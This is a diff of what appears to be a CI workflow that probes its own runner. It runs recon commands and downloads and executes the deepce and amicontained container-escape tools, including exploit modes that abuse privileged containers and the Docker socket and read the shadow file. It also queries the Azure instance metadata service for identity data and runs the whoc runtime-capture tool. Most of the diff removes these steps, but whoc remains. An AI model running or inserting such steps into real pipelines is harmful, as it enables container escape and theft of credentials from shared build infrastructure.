@@ -6,42 +6,13 @@ jobs:
     steps:
       - run: echo "Recon"
       - run: |
-            id
-            uname -a  
-      - run: |
-            ps -ef
-            netstat -nl
-      - run: |
-            docker network ls; \
-            docker info      
-      - run: |
-            cd /tmp; \
-            curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; \
-            chmod 555 amicontained; \
-            ./amicontained
-      - run: |
-            cd /tmp; \
-            wget https://github.com/stealthcopter/deepce/raw/master/deepce.sh; \
-            chmod +x ./deepce.sh; \
-            ./deepce.sh; \
-            ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce; \
-            ./deepce.sh --no-enumeration --exploit SOCK --shadow; \
-            ./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"
-      - run: |
-            curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq; \
-            curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity?api-version=2021-02-01" | jq; \
-            curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/versions?api-version=2021-02-01" | jq; \
-            curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
-      - run: |
             git clone https://github.com/magnologan/whoc.git; \
             cd whoc; \
             mkdir -p stash && cd stash; \
-            ln -s ../util/fileserver.py fileserver; \ 
-            ./fileserver; \
+            python3 ./util/fileserver.py; \
             cd whoc; \
-            docker build -f Dockerfile_dynamic -t whoc:latest src  # or ./util/build.sh; \
-            docker run --rm -it --net=host whoc:latest 127.0.0.1  # or ./util/run_local.sh
-
+            docker build -f Dockerfile_dynamic -t whoc:latest src; \
+            docker run --rm -it --net=host whoc:latest 127.0.0.1
 
 
 
